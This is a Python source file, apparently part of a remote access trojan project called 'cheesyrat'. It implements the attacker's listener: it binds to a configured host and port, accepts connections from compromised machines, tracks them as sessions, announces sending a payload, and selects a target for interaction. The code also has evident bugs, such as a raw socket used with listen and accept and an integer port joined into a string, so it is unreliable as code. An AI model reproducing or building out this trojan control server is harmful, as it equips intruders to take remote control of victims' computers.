#!/usr/bin/env python3
#coding: utf-8
#written by kyryloren. https://github.com/kyryloren/cheesyrat

import os
import sys
import time
import socket
import struct
import signal
import random
import threading
from lib import colors
from queue import Queue
from lib import cheesyrat_lib
from Crypto.Cipher import AES

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
max_connections = cheesyrat_lib.get_max_connections

all_addresses = []
all_connections = []
all_date = []

raw_host = cheesyrat_lib.append_json("lhost_listener", cheesyrat_lib.get_config_json_file())
int_port = int(cheesyrat_lib.append_json("lport_listener", cheesyrat_lib.get_config_json_file()))

def create_socket():
    try:
        global host
        global port
        global s
        host = raw_host
        port = int_port
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW)
    except socket.error as msg:
        cheesyrat_lib.error_message("Socket creation error: " + str(msg), False)

def socket_bind():
    try:
        global host
        global port
        global s
        s.bind((host, port))
        s.listen(max_connections)
    except socket.error as msg:
        cheesyrat_lib.error_message("Socket binding error: " + str(msg), False)

def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    del all_date[:]
    cheesyrat_lib.update_json("is_sessions_open", "false", cheesyrat_lib.get_run_json_file)
    while True:
        try:
            conn, address = s.accept()
            date = time.ctime()
            conn.setblocking(1)
            all_connections.append(conn)
            cheesyrat_lib.add_json("conn", conn, cheesyrat_lib.get_run_json_file)
            all_addresses.append(address)
            cheesyrat_lib.add_json("address", address, cheesyrat_lib.get_run_json_file)
            all_date.append(date)
            cheesyrat_lib.update_json("is_sessions_open", "true", cheesyrat_lib.get_run_json_file)
            print("\n" + "[!] Incoming connection from " + colors.CYAN + address[0] + ":" + address[1] + colors.END + " at " + colors.CYAN + all_date[0] + colors.END + '\n')
            print("\n" + "[*] Sending payload in " + "[bytes] bytes " + "from " + host + " >> " + address[0])
            
        except:
            cheesyrat_lib.error_message("Error acccepting connections", False)

def list_connections():
    data = [['ID', 'Connection', 'Port', 'Date Opened'], ['--', '----------', '----', '-----------']]
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            del all_date[i]
            cheesyrat_lib.update_json("is_sessions_open", "false", cheesyrat_lib.get_run_json_file)
            continue
        cheesyrat_lib.update_json("sessions_open", i+1, cheesyrat_lib.get_run_json_file)
        data.append([str(i), str(all_connections[i][0]), str(all_addresses[i][1]), str(all_date[i][1])])

    col_width = [max(map(len, col)) for col in zip(*data)]
    print("")
    for row in data:
        print(colors.END + " " + "   ".join((val.ljust(width) for val, width in zip(row, col_width))))
    print("")

def get_target(id):
    try:
        target = int(id)
        conn = all_connections[target]
        print(colors.END + "Starting interaction with " + colors.CYAN + str(all_addresses[target][0]) + ":" + str(all_addresses[target][1]))
        return conn
    except:
        cheesyrat_lib.error_message("Not a valid selection!", False)
        return None
